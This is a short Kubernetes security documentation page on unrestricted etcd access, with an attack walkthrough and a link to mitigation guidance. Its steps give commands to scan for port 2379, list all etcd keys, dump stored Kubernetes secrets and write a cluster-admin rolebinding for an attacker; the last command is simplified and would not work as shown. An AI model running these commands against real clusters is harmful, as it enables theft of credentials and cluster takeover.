---
sidebar_position: 11
title: "Unrestricted etcd Access"
description: "How attackers exploit unrestricted access to etcd to retrieve Kubernetes secrets and take control of the cluster."
---

# Unrestricted etcd Access

**etcd** is the **key-value store** used by Kubernetes to store **configuration data, secrets, and cluster state**. If **unrestricted access** is allowed, attackers can retrieve sensitive information, escalate privileges, and take full control of the cluster.

---

## Exploitation Steps: Extracting Secrets from etcd

An attacker gains access to an **unprotected etcd instance** and extracts sensitive Kubernetes data.

### Step 1: Scan for Open etcd Endpoints

The attacker checks for an **exposed etcd API** on port **2379**:

```bash
nmap -p 2379 --open <cluster-ip-range>
```

If an open etcd instance is found, the attacker proceeds.

### Step 2: Query etcd for Cluster Data

If authentication is not enforced, the attacker directly queries etcd for Kubernetes secrets:

```bash
ETCDCTL_API=3 etcdctl --endpoints=<etcd-ip>:2379 get / --prefix --keys-only
```

### Step 3: Extract Kubernetes Secrets

The attacker retrieves stored credentials, service tokens, and API keys:

```bash
ETCDCTL_API=3 etcdctl --endpoints=<etcd-ip>:2379 get /registry/secrets --prefix
```

If etcd stores **admin credentials**, the attacker gains **full cluster control**.

### Step 4: Modify Cluster Configuration

If write access is enabled, the attacker modifies **Kubernetes RBAC settings** to escalate privileges:

```bash
ETCDCTL_API=3 etcdctl --endpoints=<etcd-ip>:2379 put /registry/rbac/rolebindings/cluster-admin '{"user": "attacker", "role": "cluster-admin"}'
```

### Result

The attacker has **complete control over Kubernetes**, allowing them to **modify workloads, access secrets, and delete cluster resources**.

---

## Mitigation Steps

To protect against **unrestricted etcd access**, follow the security best practices outlined in:

➡ **[Securing etcd in Kubernetes](/docs/best_practices/cluster_setup_and_hardening/etcd_security_mitigation)**

This guide covers techniques such as **enforcing TLS encryption, restricting access with RBAC, securing backups, and isolating etcd from untrusted networks** to prevent unauthorized access.
